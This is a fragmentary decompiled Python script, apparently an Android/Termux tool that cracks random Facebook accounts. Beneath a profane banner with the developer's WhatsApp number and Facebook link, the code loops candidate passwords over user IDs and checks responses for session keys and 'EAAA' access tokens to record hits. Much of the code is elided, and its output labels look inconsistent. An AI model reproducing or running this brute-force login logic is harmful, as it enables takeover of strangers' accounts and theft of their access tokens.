# Decompile by : ALAMGIR ALAMGIR'ALAMGIR 
# Time Succes decompile : 2022-06-12 00:31:52.178972 
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/Tera.Papa.Alamgir.441"])
	exit(" [*] FACEBOOK :  https://m.me/Tera.Papa.Alamgir.441")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801712034653")
	subprocess.check_output(["am", "start", "https://wa.me/+8801712034653"])
...
\033[0;91m│                                            │
\033[0;91m└───────────────────────────────────────────────────────────┘  \033
__________________MD ALAMGIR HOSEN______________________
 ...
 > \033[0;92mDEVELOPER     : MD ALAMGIR HOSEN
 > \033[0;95mFACEBOOK ID   : https://m.me/Tera.Papa.Alamgir.441
 > \033[0;41mWHATSAPP      : +8801712034653
 \033[0;96m> CONTECT         : MD ALAMGIR HOSEN FUCK BOY
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
    """)
		print("%s [%s•%s] %sTOOL NAME : %sFUCK BOY ALAMGIR TERA PAPA"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s8.0"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s(SHOW)"%(G,R,G,Y,B))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ALAMGIR] : %s/%s -> \033[0;92m [ ALAMGIR-OK:%s ]- \033[0;93m[ALAMGIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[ALAMGIR-CP😭] %s|%s\033[0;97m         "%(uid, pw))
